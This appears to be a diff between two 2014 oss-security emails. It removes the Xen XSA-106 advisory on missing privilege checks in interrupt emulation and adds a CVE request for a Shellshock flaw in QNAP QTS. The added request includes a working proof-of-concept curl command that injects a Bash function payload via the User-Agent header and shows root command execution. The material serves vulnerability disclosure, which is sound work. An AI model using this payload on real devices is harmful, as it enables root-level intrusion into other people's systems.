@@ -1,91 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/23/3
-Message-Id: <E1XWOzI-0000xa-CH@xenbits.xen.org>
-Date: Tue, 23 Sep 2014 12:14:32 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security@....org>
-Subject: Xen Security Advisory 106 - Missing privilege level checks in x86 emulation of software interrupts
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/29/4
+Message-ID: <CAHV+4jd6hZ4nwYwtm4gkn1p0_4HD0C5T_2szOvQY8j2gLAkOgA@mail.gmail.com>
+Date: Mon, 29 Sep 2014 09:49:42 +0800
+From: Ken Lee <echain.tw@...il.com>
+To: cve-assign@...re.org
+Cc: oss-security@...ts.openwall.com
+Subject: CVE request: QNAP QTS
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hello,
 
-                    Xen Security Advisory XSA-106
-                              version 2
+QNAP QTS [1] employ Bash as the default shell and we discover an arbitrary
+code execution flaw with UID=0 via `Web administration'.
+The PoC is shown as below:
 
-    Missing privilege level checks in x86 emulation of software interrupts
+> $ curl -A '() { :;}; echo Content-Type: text/html; echo; echo
+> `/usr/bin/id`' http://QNAP_QTS:8080/cgi-bin/restore_config.cgi
+> *uid=0(admin) gid=0(administrators)*
+> HTTP/1.1 200 OK
+>
 
-UPDATES IN VERSION 2
-====================
 
-Public Release.
+{ "authPassed": 1, "Result": 0 }
 
-ISSUE DESCRIPTION
-=================
 
-The emulation of instructions which generate software interrupts fails
-to perform supervisor mode permission checks.
+This issue has been acknowledged [2] by QNAP and if not assigned yet,
+please help to arrange a CVE identifier for this issue.
+Thank you, and have a nice day.
 
-However these instructions are not usually handled by the emulator.
-Exceptions to this are
-- - when a memory operand (implicit for the affected instructions) lives
-  in (emulated or passed through) memory mapped IO space,
-- - in the case of guests running in 32-bit PAE mode, when such an
-  instruction is (in execution flow) within four instructions of one
-  doing a page table update,
-- - when an Invalid Opcode exception gets raised by a guest instruction,
-  and the guest then (likely maliciously) alters the instruction to
-  become one of the affected ones,
-- - when the guest is in real mode (in which case there are no privilege
-  checks anyway).
 
-IMPACT
-======
+Reference:
+[1] http://www.qnap.com.tw/i/en/qts4
+[2] http://www.qnap.com/useng/index.php?lang=en-us&sn=885&c=3036&sc=&n=22457
 
-Malicious HVM guest user mode code may be able to crash the guest.
-
-VULNERABLE SYSTEMS
-==================
-
-Xen versions from 3.3 onwards are vulnerable.
-
-Only user processes in HVM guests can take advantage of this
-vulnerability.
-
-MITIGATION
-==========
-
-Running only PV guests will avoid this issue.
-
-There is no mitigation available for HVM guests.
-
-CREDITS
-=======
-
-This issue was discovered Andrei Lutas at BitDefender and analyzed by
-Andrew Cooper at Citrix.
-
-RESOLUTION
-==========
-
-Applying the attached patch resolves this issue.
-
-xsa106.patch        xen-unstable, Xen 4.4.x, Xen 4.3.x, Xen 4.2.x
-
-$ sha256sum xsa106*.patch
-301060f801ab39c15ac773e1bcc250f0e6bf30d748007a96173459b83afc9270  xsa106.patch
-$
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-
-iQEcBAEBAgAGBQJUIWPoAAoJEIP+FMlX6CvZeUAIAIV9TvZK3c6ffMYcWOaeRa+s
-bSZiFhIzMumnxpJTgCBjqOsQHT5bw1CTf3iW49SBsHly5X/oWJg0ys+shWjBXKl0
-SwAkJcywOG3c2ZdxyCJdSM2eQbOhDgympqde7GTTkG29uoqAyAa0kDXn9lBllJPY
-H7ZIB7K+EA77yxgADH/YO4ZGFWelnUaOb+3qorw3GtdWAVHhhXr4Gnq98vOFnRlU
-7JI71KH647gjiBQgdy6Wmkn7q7xsLfpYkxs9YronwyjxxHnEOO3Gx3zkEHHIaio/
-YzqQPh96d1FZaO5La8ddhlBDyulDDMVKwLg82rtICD8kWwTtqZHuSFHbTmvC+qs=
-=rTiy
------END PGP SIGNATURE-----
-
-Download attachment "xsa106.patch" of type "application/octet-stream" (922 bytes)
